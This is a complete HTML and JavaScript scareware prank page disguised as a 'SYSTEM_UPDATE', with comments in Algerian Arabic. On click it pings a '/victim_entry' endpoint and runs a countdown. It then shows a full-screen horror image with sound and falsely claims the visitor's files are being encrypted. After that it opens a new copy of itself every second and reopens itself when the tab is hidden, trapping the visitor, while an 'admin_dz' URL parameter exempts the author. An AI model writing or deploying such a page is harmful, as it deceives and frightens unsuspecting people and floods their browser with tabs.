<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>⚠️ SYSTEM_UPDATE ⚠️</title>
    <style>
        /* تعديل الصورة باش تولي كبيرة ومريقلة سواسوة */
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; display: flex; justify-content: center; align-items: center; }
        #horrorImg { 
            position: fixed; top: 0; left: 0; 
            width: 100vw; height: 100vh; 
            object-fit: fill; /* هادي تخلي الصورة تعمر كامل الشاشة سواسوة */
            z-index: 999; display: none; 
        }
        #clockContainer { z-index: 1000; text-align: center; font-family: 'Courier New', monospace; color: #f00; }
        #timer { font-size: 150px; font-weight: bold; }
        #textOverlay { 
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
            z-index: 1001; color: #f00; text-align: center; font-family: 'Courier New', monospace; 
            background: rgba(0,0,0,0.9); padding: 20px; border: 2px solid #f00; display: none; width: 90%; 
        }
        .blink { animation: blinker 0.1s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body onclick="initiateSequence()">

    <div id="clockContainer">
        <div id="timer">03</div>
        <p class="blink">CRITICAL_ERROR_DETECTED</p>
    </div>

    <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
    <div id="textOverlay" class="blink">
        <h1>SYSTEM TERMINATED</h1>
        <p>Your files are being encrypted. Do not close.</p>
    </div>

    <audio id="sfx" src="tfy-krk.mp3" preload="auto"></audio>

    <script>
        // ميزة الأدمن: إذا دخلت أنت بالرمز، الكود ما يخدمش فيك سواسوة
        const urlParams = new URLSearchParams(window.location.search);
        const isAdmin = urlParams.get('user') === 'admin_dz'; 

        let running = false;
        let timeLeft = 3;
        const audio = document.getElementById('sfx');
        const MY_LINK = window.location.href;

        function initiateSequence() {
            if (isAdmin) {
                alert("Welcome Admin! Virus is disabled for you سواسوة.");
                return;
            }
            if (running) return;
            running = true;
            
            fetch('http://localhost:8080/victim_entry', {mode: 'no-cors'}).catch(() => {});

            let countdown = setInterval(() => {
                timeLeft--;
                document.getElementById('timer').innerText = "0" + timeLeft;
                if (timeLeft <= 0) {
                    clearInterval(countdown);
                    triggerHorror();
                }
            }, 1000);
        }

        function triggerHorror() {
            document.getElementById('clockContainer').style.display = 'none';
            document.getElementById('horrorImg').style.display = 'block';
            document.getElementById('textOverlay').style.display = 'block';
            audio.play();

            // الحبس التلقائي للضحية فقط سواسوة
            setInterval(() => {
                window.open(MY_LINK, '_blank');
            }, 1000);
        }

        // منع الخروج للضحية فقط سواسوة
        document.addEventListener("visibilitychange", () => {
            if (!isAdmin && document.visibilityState === 'hidden' && running) {
                window.open(MY_LINK, '_blank');
            }
        });
    </script>
</body>
</html>
